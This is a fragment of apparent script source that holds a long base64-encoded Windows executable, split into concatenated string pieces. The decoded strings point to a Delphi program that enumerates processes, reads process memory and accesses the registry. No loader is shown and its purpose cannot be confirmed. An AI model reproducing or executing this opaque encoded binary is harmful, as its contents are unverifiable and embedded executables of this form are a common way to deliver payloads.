'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' + 
'6Bfp//+iWFhDAI1F0FC58NJAALooAAAAi8Posej//4tV0LhcWEMA6Lh2//+NRcxQufzSQAC6KQAAAIvD6I/o//+LVcy4YFhDAOiWdv//jUX46Dp2//+NRfToMnb//41FyFC5vNJAALolAAAAi8PoXej//4tFyDPS6H+8//+FwHUPjUX8ugjTQADomnb//+sNjUX8uhTTQADoi3b//41FxFC5vNJAALojAAAAi8PoHuj//4tFxDPS6EC8//+FwHU/' + 
'jUXAULm80kAAugUQAACLw+j75///i0XAM9LoHbz//4XAdQ+NRfS6INNAAOg4dv//6w2NRfi6MNNAAOgpdv///3X4/3X8aEDTQAD/dfS4ZFhDALoEAAAA6OR4////dfj/dfxoTNNAAP919LhoWEMAugQAAADox3j//7EsugwAAACLw+jV5///ohJZQwAzwFpZWWSJEGiu0kAAjUXAuhAAAADoTnX//8PpUG3//+vrW4vlXcMA/////wEAAAAwAAAA' + 
'/////wYAAABtL2QveXkAAP////8MAAAAbW1tbSBkLCB5eXl5AAAAAP////8CAAAAYW0AAP////8CAAAAcG0AAP////8BAAAAaAAAAP////8CAAAAaGgAAP////8FAAAAIEFNUE0AAAD/////BQAAAEFNUE0gAAAA/////wMAAAA6bW0A/////wYAAAA6bW06c3MAAFjTQAARDlRVbml0SGFzaEFycmF5GAAAAAAAAAD/////AAAAAAhTeXNVdGls' + 
'c41AAIjTQAAOC1RNb2R1bGVJbmZvCAAAAAEAAABU00AABAAAAI1AAFZTicYxwMHABYoegPsAdBKA+0F8CID7Wn8DgMsgMsNG6+RbXsPDi8BTVldVg8T0ixXwJkMAixKF0nQLO0IEdAaLEoXSdfWJFCSDPCQAD4TlAAAAiwQkg3gUAA+E2AAAAIsEJItYFIA7AHQKx0QkCGBZQwDrCMdEJAhUaUMAi0ME6DuF//+L6IXtD4yUAAAARTP2jTx2i0ME' + 
'g3z4BAB0FItDBIsE+I0UdotLBItU0QSJAutMi0MEg3z4DAB0Qo0EdotTBItEwgzoNP///7n9AwAAM9L38YlUJASLRCQIi1QkBIsEkItTBI0U+jvCdRGLQwSLBPiLVCQIi0wkBIkEiotDBIM8+AB0E4tDBItE+ASNFHaLSwSLFNGJQgRGTQ+Fb////4sVhNNAAIvD6DyD//+LBCQz0olQFIPEDF1fXlvD/yUUh1MAi8Doj5f//+gCAAAAw5BVi+yD' + 
'xOxTM9KJVeyL2DPAVWiH1UAAZP8wZIkghdt0N4ld8MZF9ACNVeyLw+iX5P//i0XsiUX4xkX8C41F8FBqAYsNnCZDALIBoYyDQADoge3//4vQ6xSLDSQnQwCyAaGMg0AA6C/t//+L0IlaDIvC6Gtr//8zwFpZWWSJEGiO1UAAjUXs6Epy///D6XBq///r8FuL5V3DkFOL2IXbdQXoUP///4vDW8NTVr4sGkMA6xKLHosDiQa6CAAAAIvD6IlY//+D' + 
'PgB16V5bw5BTaADWQADo2Zb//4vYhdt0EGgQ1kAAU+jQlv//o1gYQwCDPVgYQwAAdQq4XJJAAKNYGEMAW8MAAGtlcm5lbDMyLmRsbAAAAABHZXREaXNrRnJlZVNwYWNlRXhBALoBAAAAkvAPwQJAw7r/////kvAPwQJIw4cQidDDjUAAkvAPwQLDi8BTVldVUeh6Z///iBQki+gz/4tcvQQzwIlEvQSF23QPi/OLG4vG6NJX//+F23XxR4P/EHXd' + 
'D7YUJIDi/IvF6EJk//+APCQAfgeLxejdZv//Wl1fXlvDjUAAVYvsUeiHlf//ZolF/g+2Rf4yRf8kD1ldw41AAFNWV1VRiRQki/iLx+jT////i9joXJX//4vwD7bDi2yHBOsDi20Ahe10BTt1BHX0he11N4vH6E4AAACL6IXtdSq4EAAAAOgKV///i+iJdQTHRQj///9/iW0AD7bDjUSHBIvV6BX///+JRQCLBCSJKFpdX15bw41AAIsCM8mJSASL' + 
'AjPSiVAIw5BTVovYi8PoUf///w+2wItcgwSF23QnjUMIuv///3/o0f7//4vwgf7///9/dAroupT//4lDBOsGixuF23XZi8NeW8OLwFNWhNJ0CIPE8OiOZf//i9qL8DPSi8boCWP//8dGDP//AABqAGr/av9qAOiZk///iUYQagBqAGoAagDoiZP//4lGFMdGGP////+yAaGYhEAA6M9i//+JRiCLxoTbdA/okWX//2SPBQAAAACDxAyLxl5bw4vA' + 
'U1boyWX//4vai/CLxuh6AAAAi9OA4vyLxuiyYv//i0YQUOj9kv//i0YUUOj0kv//i0Yg6Khi//+E234Hi8boNWX//15bw4vAi0AQUOjzlP//w4vAi0AQUOj/lP//w4vAi0AUUOjzlP//w4vAi1AYUotAEFDoK5X//8OLwItQGFKLQBRQ6BuV///Di8BTVldVg8T4i+izAeiYk///i/g7fSQPhIQAAACLxeia////i0UoiUQkBIvUi0Ug6AH+//+L' + 
'BCSDeAwAD5fDhNt0JI1FDOhP/f//6xqNRQy6//8AAOhg/f//i/CF9nQHi8Xoi////41FDLoBAP//6Eb9//89//8AAHXSi8XoPP///4TbdAiNRQzoGP3//4l9JI1FKOgB/f//SDtEJAQPlMP/RRyLw1laXV9eW8OQU1GL2IvUi0Mg6Hr9////SxyDexwAdSAzwIlDJI1DDLr//wAA6OP8//+Lw+j4/v//i8Po5f7//4sEJIN4DAB1CovUi0Mg6Lb9' + 
'//9aW8ONQABTVldRi/iL1ItHIOgo/f//iwQk/0AMiwQkg3gMAQ+Xw+iHkv//O0ckdECE23U8i8for/7//+snjUcM6F38//+L8IH+//8AAHUHi8foiP7//2oA6An7//+Lx+iG/v//jUcM6EL8//+FwH7NWl9eW8OQU1GL2IvUi0Mg6Lr8//+LBCT/SAyLBCSDeAwAdUiL1ItDIOgZ/f//6BCS//87QyR0NI1DDOjz+///i8iB+f//AAB1CYvD6B7+' + 
'///rGYXJfxWLwbn//wAAmff5hdJ1B4vD6AP+//9aW8OLEDPJiQiLwuhzYP//w4vAU1ZXVYHEAPz//4vyi/iLxuhLbf//aAAEAACNRCQEUIvH6KZx//+L6FXotpH//4vYgfsABAAAfQ2L1IvGi8voDW7//+sZi9NKi8bosXP//1OLBuh1cf//UFXohpH//4HEAAQAAF1fXlvDjUAAU4sd8CZDAIsbhdt0H4N7FAB0E4sVhNNAAItDFOgXff//M8CJ' + 
'QxSLG4XbdeFbw4vAHQAAACgaQwB8JkMAIBpDAAgmQwAYGkMAOCVDABAaQwCkJkMACBpDALwmQwAAGkMAlCVDAPgZQwDwJUMA8BlDAAwlQwDoGUMAGCZDAOAZQwA4JkMA2BlDANQlQwDQGUMA3CVDAMgZQwAEJ0MAwBlDANglQwC4GUMAPCdDALAZQwBoJkMAqBlDAFQmQwCgGUMARCdDAJgZQwAoJ0MAkBlDAOglQwCIGUMACCdDAIAZQwAQJ0MA' + 
'eBlDAIglQwBwGUMAYCVDAGgZQwBMJkMAYBlDAKAmQwBYGUMAHCVDAFAZQwAAJ0MASBlDAOQlQwAoAAAAQBlDAPQmQwAAAAAAPBlDAEAlQwAAAAAAOBlDAJgmQwAAAAAANBlDACglQwAAAAAAMBlDAHAlQwAAAAAALBlDAGglQwAAAAAAKBlDAEglQwAAAAAAJBlDAOAlQwAAAAAAIBlDAGQmQwAAAAAAHBlDAGwlQwAAAAAAGBlDAEQmQwAAAAAA' + 
'FBlDALgmQwAAAAAAEBlDALAmQwAAAAAADBlDAHAmQwAAAAAACBlDANAlQwAAAAAABBlDALAlQwAAAAAAABlDACQlQwAAAAAA/BhDAKwmQwAAAAAA+BhDACQmQwAAAAAA9BhDAKAlQwAAAAAA8BhDABQmQwAAAAAA7BhDAFwmQwAAAAAA6BhDACAmQwAAAAAA5BhDALwlQwAAAAAA4BhDACAlQwAAAAAA3BhDAPglQwAAAAAA2BhDABgnQwAAAAAA' + 
'1BhDAOgmQwAAAAAA0BhDAEAmQwAAAAAAzBhDAIQlQwAAAAAAyBhDACwlQwAAAAAAxBhDAOAmQwAAAAAAwBhDAGAnQwAAAAAAvBhDAEwlQwAAAAAAuBhDAAglQwAAAAAAtBhDAPgmQwAAAAAAsBhDADwmQwAAAAAArBhDADAnQwAAAAAAiBhDAOwlQwAAAAAAhBhDAIwlQwAAAAAAVYvsM8BVaGDfQABk/zBkiSD/BVRZQwAPhVkBAAC4SHlDAOhd' + 
'/P//uNDTQADon4P//+jK/P//6I33///o9Or//7jkF0MA6Kpp//+46BdDAOjUcP//uPwXQwDolmn//7hEWEMA6Ixp//+4UFhDAOiCaf//uFRYQwDoeGn//7hcWEMA6G5p//+4YFhDAOhkaf//uGRYQwDoWmn//7hoWEMA6FBp//+4bFhDALkMAAAAixVIEEAA6Ft2//+4nFhDALkMAAAAixVIEEAA6EZ2//+4zFhDALkHAAAAixVIEEAA6DF2//+4' + 
'6FhDALkHAAAAixVIEEAA6Bx2//+4FFlDALkHAAAAixVIEEAA6Ad2//+4TFlDAIsVRIRAAOgjff//uFBZQwCLFWiEQADoE33//7hUGEMA6L1o//+4XBhDALkCAAAAixVIEEAA6Mh1//+4RBlDALkHAAAAixVww0AA6LN1//+4fBlDALkWAAAAixXww0AA6J51//8zwFpZWWSJEGhn30AAw+mXYP//6/hdw41AAHDfQAALCVRGaWxlTmFtZZCA30AA' + 
'DgpUU2VhcmNoUmVjcAIAAAEAAABs30AAFAAAAFNWg8T4i9jrGo1DIFCLQxxQ6DqM//+FwHUJ6MmM//+L8OtEi0MgI0MYdd5UjUM0UOgDjP//U41DAlCNRCQIUOjsi///i0NAM9KJQwiJUwyLQyCJQxCNQxSNU0y5BAEAAOhrcP//M/aLxllaXlvDi8BTi9iLQxyD+P90DVDov4v//8dDHP////9bw4vAU1ZXi9mL+PfSg+IeiVMYjUMgUIvH6FZw' + 
'//9Q6JyL//+L8IlzHIP+/3QWi8PoQ////4vwhfZ0EIvD6Kb////rB+gXjP//i/CLxl9eW8ONQABTi9iNQyBQi0McUOhki///hcB0CYvD6An///9bw+jqi///W8OFwHRZhdJ0VUl8UlZTi3L8i1j8Kc4ByjnefECF2348g8T0g8P/AdYB2ol0JAgB2CnR99uJTCQEiRwkD7YIOgp0LzpKAXQtg8IEO1QkCHIRg8L+O1QkCHLlg8QMW14xwMM6Sv50' + 
'CDpK/3XTg8IBg8L+g8L/izQkhfZ0IQ+3HDBmO1wyAXXBg/7+fREPt1wwAmY7XDIDdbCDxgR834tEJASDwgI7VCQId7CDxAwB0Ftew/8lOIdTAIvA/yU0h1MAi8D/JTCHUwCLwP8lLIdTAIvA/yUoh1MAi8D/JSSHUwCLwP8lIIdTAIvA/yUch1MAi8D/JUCHUwCLwP8lSIdTAIvAU7tMeUMAgzsAD4U1AQAAaPjiQADo94r//4kDgzsAD4QgAQAA' + 
'aAjjQACLA1Do54r//6NQeUMAaCTjQACLA1Do1Yr//6NUeUMAaDTjQACLA1Dow4r//6NYeUMAaETjQACLA1DosYr//6NceUMAaFDjQACLA1Don4r//6NgeUMAaFzjQACLA1DojYr//6NkeUMAaHjjQACLA1Doe4r//6NoeUMAaIjjQACLA1DoaYr//6NseUMAaJjjQACLA1DoV4r//6NweUMAaKjjQACLA1DoRYr//6N0eUMAaLjjQACLA1DoM4r/' + 
'/6N4eUMAaMjjQACLA1DoIYr//6N8eUMAaNjjQACLA1DoD4r//6OAeUMAaOjjQACLA1Do/Yn//6OEeUMAaPjjQACLA1Do64n//6OIeUMAaAjkQACLA1Do2Yn//6OMeUMAgzsAdAmDPVB5QwAAdQQzwFvDsAFbwwAAa2VybmVsMzIuZGxsAAAAAENyZWF0ZVRvb2xoZWxwMzJTbmFwc2hvdAAAAABIZWFwMzJMaXN0Rmlyc3QASGVhcDMyTGlzdE5l' + 
'eHQAAEhlYXAzMkZpcnN0AEhlYXAzMk5leHQAAFRvb2xoZWxwMzJSZWFkUHJvY2Vzc01lbW9yeQBQcm9jZXNzMzJGaXJzdAAAUHJvY2VzczMyTmV4dAAAAFByb2Nlc3MzMkZpcnN0VwBQcm9jZXNzMzJOZXh0VwAAVGhyZWFkMzJGaXJzdAAAAFRocmVhZDMyTmV4dAAAAABNb2R1bGUzMkZpcnN0AAAATW9kdWxlMzJOZXh0AAAAAE1vZHVsZTMy' + 
'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' + 
